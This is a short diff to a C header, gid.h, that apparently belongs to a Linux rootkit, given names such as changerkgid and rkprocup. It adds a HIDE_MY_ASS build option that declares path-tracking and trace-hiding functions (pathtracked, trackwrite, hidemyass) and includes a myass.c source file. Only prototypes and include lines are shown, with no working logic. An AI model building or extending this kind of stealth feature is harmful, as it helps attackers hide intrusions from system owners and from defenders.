@@ -1,13 +1,23 @@
 #ifndef _GID_H_
 #define _GID_H_
 
+#ifdef HIDE_MY_ASS
+int pathtracked(const char *pathname);
+void trackwrite(const char *pathname);
+void hidemyass(void);
+#endif
+
 #ifdef READ_GID_FROM_FILE
 gid_t changerkgid(void);
 #include "change.c"
 #endif
 
+
 gid_t readgid(void);
 #include "readgid.c"
+#ifdef HIDE_MY_ASS
+#include "myass.c"
+#endif
 
 #ifdef AUTO_GID_CHANGER
 int rkprocup(void);
